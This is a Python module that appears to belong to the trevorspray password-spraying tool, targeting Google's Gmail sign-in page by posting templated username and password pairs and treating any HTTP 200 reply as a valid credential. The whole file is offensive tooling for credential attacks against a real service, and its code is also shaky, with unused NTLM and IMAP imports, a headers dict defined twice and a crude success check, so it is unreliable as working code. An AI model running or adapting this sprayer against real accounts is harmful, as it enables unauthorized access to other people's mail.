import logging
from ..util import ntlmdecode
from .base import BaseSprayModule
from tldextract import tldextract
from requests_ntlm import HttpNtlmAuth
from sys import exit
from argparse import ArgumentParser
from imaplib import IMAP4_PORT, IMAP4_SSL_PORT


log = logging.getLogger("trevorspray.sprayers.gmail")

class SprayModule(BaseSprayModule):

    # HTTP method
    method = 'POST'
    # default target URL
    default_url = 'https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1'
    # body of request
    request_data = { 
		  "username": "{username}",
                  "password": "{password}",
}
    # HTTP headers
    headers = {}
    # HTTP cookies
    cookies = {}
    # Don't count nonexistent accounts as failed logons
    fail_nonexistent = False

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ',
    }


    def check_response(self, response):
        '''
        returns (valid, exists, locked, msg)
        '''

        valid = False
        exists = None
        locked = None
        msg = 'application specific password required'

        if getattr(response, 'status_code', 0) == 200:
            valid = True
            exists = True
            msg = 'Valid cred'

        return (valid, exists, locked, msg)
